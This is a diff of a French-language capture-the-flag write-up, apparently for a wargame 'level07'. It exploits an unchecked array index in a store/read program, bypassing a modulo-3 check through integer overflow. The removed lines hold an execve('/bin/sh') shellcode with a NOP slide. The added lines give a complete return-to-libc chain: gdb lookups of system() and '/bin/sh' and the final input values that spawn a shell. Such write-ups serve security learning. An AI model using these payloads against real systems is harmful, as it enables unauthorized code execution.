@@ -1,8 +1,10 @@
 Ce programme nous permet d'entrer une command de {store;read;quit}, ce qui va nous permettre d'ecrire ou de lire un buffer.
 
-Il n'y a pas de bounds check donc on peut theoriquement overwrite la stack, y compris RIP.
+Il n'y a pas de bounds check donc on peut theoriquement overwrite la stack, y compris le save de EIP.
 
-## Trouver EIP
+argv et env sont reset a 0 au debut du programme, donc on ne pourra pas y stoquer un shellcode. Au vu du fonctionnement du programme, le mieux serait de faire un return-to-libc.
+
+## Trouver le save de EIP
 ```
 push %ebp -> 4 bytes
 push %edi -> 4 bytes
@@ -21,59 +23,53 @@ L'addresse de EIP relative au buffer est: \
 Pour avoir l'index on divise par la taille d'un int: 456 / 4 = 114 \
 114 est divisible par 3, donc on ne pourra pas utiliser cet index directement.
 
-L'index est multipliee par 4 en faisant un shl de 2 juste avant le mov, donc le check % 3 peut etre contourne en jouant avec l'un des 2 haut bits car ils seront jetes apres, ce qui rendra l'index non divisible par 3.
+L'index est multiplie par 4 en faisant un shl de 2 juste avant le mov, donc le check % 3 peut etre contourne en jouant avec l'un des 2 haut bits car ils seront jetes apres, ce qui rendra l'index non divisible par 3.
 
-Exemple:
-> Index de base: 0b10000000000000000000000000000000 = 2147483648 \
-> Index final: 2147483648 + 114 = 2147483762
-
-## Le shellcode
-Nous allons utiliser le buffer pour injecter notre shellcode en utilisant store. En utilisant gdb on voit que l'adresse reelle du buffer est 0xffffd554 (4294956372). Cependant, l'adresse peut changer de plusieurs bytes a chaque nouveau lancement. On injectera donc notre shellcode avec une nop slide.
 ```
-(gdb) disas main
-Dump of assembler code for function main:
-   0x08048723 <+0>:	push   %ebp
-    ...
-   0x08048791 <+110>:	lea    0x24(%esp),%ebx
-   0x08048795 <+114>:	mov    $0x0,%eax
+Index de base: 0b10000000000000000000000000000000 = 2147483648
+Index final: 2147483648 + 114 = 2147483762
+```
 
-(gdb) b *0x08048795
-Breakpoint 1 at 0x8048795
+## Preparer le return2libc
+On va chercher l'adresse d'une chaine de caractere "/bin/sh" et l'adresse de la fonction system dans l'executable ou l'une des libs qui sont chargees.
+```
+(gdb) b main
 (gdb) run
 Starting program: /home/users/level07/level07
 
-Breakpoint 1, 0x08048795 in main ()
-(gdb) info registers
-...
-ebx            0xffffd554
-...
+Breakpoint 1, 0x08048729 in main ()
+(gdb) info proc map
+process 1746
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+ ...
+    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+    0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+    0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+    0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+ ...
+(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+(gdb) info functions system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
 ```
 
-On doit regrouper notre shellcode par paquet de 4 et inverser l'ordre des bytes:
-`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`
+## Final
+On ecrit a l'index 2147483762 l'adresse de la fonction system (0xf7e6aed0 = 4159090384), et a l'adresse 116 l'argument pour system (0xf7f897ec = 4160264172).
+
 ```
-31 c9 f7 e1
-b0 0b 51 68
-2f 2f 73 68
-68 2f 62 69
-6e 89 e3 cd
-80 00 00 00
+store
+4159090384
+2147483762
+store
+4160264172
+116
+quit
 ```
-```
-e1 f7 c9 31
-68 51 0b b0
-68 73 2f 2f
-69 62 2f 68
-cd e3 89 6e
-00 00 00 80
-```
-```
-3791112497
-1750141872
-1752379183
-1768042344
-3454241134
-128
-```
-La nop slide:
-90909090 = 2425393296
